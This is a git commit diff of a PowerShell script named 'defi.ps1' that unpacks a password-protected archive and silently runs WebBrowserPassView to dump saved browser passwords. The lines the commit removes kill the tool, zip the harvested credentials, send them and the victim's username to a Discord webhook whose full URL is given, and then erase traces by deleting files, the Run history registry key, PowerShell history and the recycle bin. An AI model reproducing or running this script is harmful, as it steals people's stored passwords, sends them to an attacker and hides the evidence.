12c139a4f3710d8bd71e9f773cb1afb7074edd74
pedrito12a <153040660+pedrito12a@users.noreply.github.com>
2023-12-26 14:09:17 +0100

    Update defi.ps1

--- defi.ps1
+++ defi.ps1
@@ -9,24 +9,3 @@ Expand-Archive 7z.zip
 .\7z\7za.exe e -p'wbpv28821@' wbpv.zip
 Start-Sleep -Seconds 5
 Start-Process -FilePath .\WebBrowserPassView.exe -Wait -WindowStyle Hidden
-
-Start-Sleep -Seconds 30
-taskkill /IM WebBrowserPassView.exe /F 
-$hookurl='https://discord.com/api/webhooks/1180337343920615434/dPohBhRKx_M_MeRIEQQjdOsPTydHKpwg_Vt6nOJU2ZeREXnDfQXV08laAiP2I45nQLBj'
-$fileSaveDir = 'C:\temp'
-$date = get-date
-$filename = 'j'
-$filepath = Get-ChildItem -Path "$fileSaveDir" -Filter "$filename" -Recurse | % {$_.FullName}
-Compress-Archive -Path $fileSaveDir\j.txt -DestinationPath c:\export.zip -Force
-$Body = @{'username' = $env:username; 'content' = "Obiwan: Hello there!"}
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F 'file1=@c:\export.zip' $hookurl
-
-rm -r C:\temp -recurse -Force
-rm -r C:\export.zip
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
